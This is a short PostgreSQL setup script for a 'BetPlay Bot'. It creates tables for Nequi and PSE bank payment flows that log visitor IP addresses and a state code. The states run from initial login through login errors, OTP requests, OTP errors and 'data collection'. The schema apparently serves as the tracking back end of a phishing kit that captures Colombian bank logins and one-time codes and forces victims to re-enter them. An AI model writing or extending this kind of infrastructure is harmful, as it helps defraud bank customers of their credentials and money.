-- Database Initialization Script for BetPlay Bot
-- DBMS: PostgreSQL

-- 1. Create Tables

-- Table for Nequi flow
CREATE TABLE IF NOT EXISTS nequi (
    id SERIAL PRIMARY KEY,
    estado INTEGER DEFAULT 1,
    ip_address VARCHAR(50),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Table for Generic PSE flow (Bancolombia, Davivienda, etc.)
CREATE TABLE IF NOT EXISTS pse (
    id SERIAL PRIMARY KEY,
    estado INTEGER DEFAULT 1,
    ip_address VARCHAR(50),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- 2. Notes
-- 'estado' values:
-- 1: Initial Login
-- 2: Error Login
-- 3: OTP Requested
-- 4: OTP Error
-- 6: Data collection
-- 0: Finished
